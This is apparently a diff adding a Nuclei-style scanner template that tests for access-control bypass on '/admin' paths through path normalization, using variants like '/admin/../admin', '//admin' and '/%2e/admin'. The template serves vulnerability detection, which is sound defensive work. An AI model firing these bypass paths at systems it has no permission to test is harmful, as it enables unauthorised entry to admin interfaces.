@@ -1,0 +1,31 @@
+id: whai-path-normalization-bypass
+
+info:
+  name: Path Normalization Access Control Bypass
+  author: whitehat-ai
+  severity: high
+  description: Tests access control bypass via path normalization
+  tags: path-traversal,access-control,high
+  classification:
+    cwe-id: CWE-22
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/../admin"
+      - "{{BaseURL}}//admin"
+      - "{{BaseURL}}/./admin"
+      - "{{BaseURL}}/admin%2f"
+      - "{{BaseURL}}/%2e/admin"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "dashboard"
+        condition: or
